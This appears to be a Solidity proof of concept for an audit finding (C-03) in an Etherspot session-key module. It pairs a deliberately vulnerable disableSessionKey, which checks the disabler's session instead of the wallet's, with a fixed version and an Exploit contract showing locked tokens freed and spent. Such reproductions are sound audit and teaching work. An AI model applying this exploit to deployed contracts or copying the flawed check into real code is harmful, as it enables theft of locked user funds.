// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Etherspot CredibleAccountModule — C-03 (Shieldify, commit d4774db, 2025-06)
    disableSessionKey() lets a SESSION_KEY_DISABLER through because the
    locked-token check reads sessionData[key][msg.sender]. The disabler has
    no session, so validUntil is 0 and `0 >= block.timestamp` is false.
    The live unclaimed session on the victim wallet is deleted anyway.
    The wallet can then spend the 1,000 tokens that were locked.
    The control reads sessionData[key][targetWallet] and reverts
    LockedTokensNotClaimed, so the 1,000 stays locked and unspent.
*/

contract Usdc {
    string public name = "USD Coin";
    string public symbol = "USDC";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract ModuleBase {
    uint256 public constant LOCKED = 1_000e18;
    address public constant SESSION = 0x0000000000000000000000000000000000005e55;

    struct SessionData {
        address sessionKey;
        uint48 validAfter;
        uint48 validUntil;
        bool live;
    }

    struct LockedToken {
        address token;
        uint256 lockedAmount;
        uint256 claimedAmount;
    }

    error Unauthorized(address caller);
    error NoSession(address sessionKey);
    error LockedTokensNotClaimed(address sessionKey);

    mapping(address => bool) public isDisabler;
    mapping(address => address) public sessionKeyToWallet;
    mapping(address => mapping(address => SessionData)) public sessionData;
    mapping(address => LockedToken) public lockedTokens;
    mapping(address => address[]) internal walletKeys;

    address public disabledFor;
    address public checkedWallet;
    uint48 public checkedUntil;

    constructor() {
        isDisabler[msg.sender] = true;
    }

    function enableSessionKey(address sessionKey, uint48 validAfter, uint48 validUntil, uint256 amount) external {
        sessionData[sessionKey][msg.sender] = SessionData({
            sessionKey: sessionKey,
            validAfter: validAfter,
            validUntil: validUntil,
            live: true
        });
        lockedTokens[sessionKey] = LockedToken({token: address(0), lockedAmount: amount, claimedAmount: 0});
        walletKeys[msg.sender].push(sessionKey);
        sessionKeyToWallet[sessionKey] = msg.sender;
    }

    function isSessionClaimed(address sessionKey) public view returns (bool) {
        LockedToken memory t = lockedTokens[sessionKey];
        return t.lockedAmount == t.claimedAmount;
    }

    function lockedOf(address wallet) public view returns (uint256) {
        address[] memory keys = walletKeys[wallet];
        uint256 total;
        for (uint256 i; i < keys.length; ++i) {
            SessionData memory sd = sessionData[keys[i]][wallet];
            if (sd.live && sd.validUntil >= block.timestamp) {
                LockedToken memory t = lockedTokens[keys[i]];
                total += t.lockedAmount - t.claimedAmount;
            }
        }
        return total;
    }

    function _removeSessionKey(address sessionKey, address wallet) internal {
        delete sessionData[sessionKey][wallet];
        delete lockedTokens[sessionKey];
        delete sessionKeyToWallet[sessionKey];
        address[] storage keys = walletKeys[wallet];
        for (uint256 i; i < keys.length; ++i) {
            if (keys[i] == sessionKey) {
                keys[i] = keys[keys.length - 1];
                keys.pop();
                break;
            }
        }
        disabledFor = wallet;
    }
}

contract CredibleAccountModule is ModuleBase {
    function disableSessionKey(address _sessionKey) external {
        address sessionOwner = sessionKeyToWallet[_sessionKey];
        if (!isDisabler[msg.sender] && msg.sender != sessionOwner) {
            revert Unauthorized(msg.sender);
        }
        address targetWallet = sessionOwner != address(0) ? sessionOwner : msg.sender;
        if (sessionData[_sessionKey][targetWallet].validUntil == 0) {
            revert NoSession(_sessionKey);
        }
        checkedWallet = msg.sender;
        checkedUntil = sessionData[_sessionKey][msg.sender].validUntil;
        // @> VULN: validUntil is read for msg.sender, not targetWallet, so a disabler's 0 skips the lock
        if (sessionData[_sessionKey][msg.sender].validUntil >= block.timestamp && !isSessionClaimed(_sessionKey)) {
            revert LockedTokensNotClaimed(_sessionKey);
        }
        _removeSessionKey(_sessionKey, targetWallet);
    }
}

contract CredibleAccountModuleFixed is ModuleBase {
    function disableSessionKey(address _sessionKey) external {
        address sessionOwner = sessionKeyToWallet[_sessionKey];
        if (!isDisabler[msg.sender] && msg.sender != sessionOwner) {
            revert Unauthorized(msg.sender);
        }
        address targetWallet = sessionOwner != address(0) ? sessionOwner : msg.sender;
        if (sessionData[_sessionKey][targetWallet].validUntil == 0) {
            revert NoSession(_sessionKey);
        }
        checkedWallet = targetWallet;
        checkedUntil = sessionData[_sessionKey][targetWallet].validUntil;
        if (sessionData[_sessionKey][targetWallet].validUntil >= block.timestamp && !isSessionClaimed(_sessionKey)) {
            revert LockedTokensNotClaimed(_sessionKey);
        }
        _removeSessionKey(_sessionKey, targetWallet);
    }
}

contract Wallet {
    Usdc public immutable token;
    ModuleBase public immutable module;
    uint256 public spent;

    constructor(Usdc _token, ModuleBase _module) {
        token = _token;
        module = _module;
    }

    function enable(address sessionKey, uint48 validAfter, uint48 validUntil, uint256 amount) external {
        module.enableSessionKey(sessionKey, validAfter, validUntil, amount);
    }

    function spend(address to, uint256 amount) external {
        uint256 locked = module.lockedOf(address(this));
        uint256 bal = token.balanceOf(address(this));
        require(bal - locked >= amount, "locked");
        token.transfer(to, amount);
        spent = amount;
    }
}

contract Exploit {
    Usdc public token;
    CredibleAccountModule public module;
    Wallet public wallet;

    constructor() {
        token = new Usdc();
        module = new CredibleAccountModule();
        wallet = new Wallet(token, ModuleBase(address(module)));
    }

    function run() external {
        token.mint(address(wallet), module.LOCKED());
        wallet.enable(module.SESSION(), 1, type(uint48).max, module.LOCKED());
        require(module.lockedOf(address(wallet)) == module.LOCKED(), "locked before");
        module.disableSessionKey(module.SESSION());
        require(module.checkedWallet() == address(this), "checked disabler");
        require(module.checkedUntil() == 0, "disabler has no session");
        require(module.disabledFor() == address(wallet), "victim key removed");
        require(module.lockedOf(address(wallet)) == 0, "lock wiped");
        wallet.spend(msg.sender, module.LOCKED());
        require(token.balanceOf(msg.sender) == module.LOCKED(), "spent 1000");
        require(wallet.spent() == module.LOCKED(), "spend recorded");
        require(token.balanceOf(address(wallet)) == 0, "wallet emptied");
    }
}
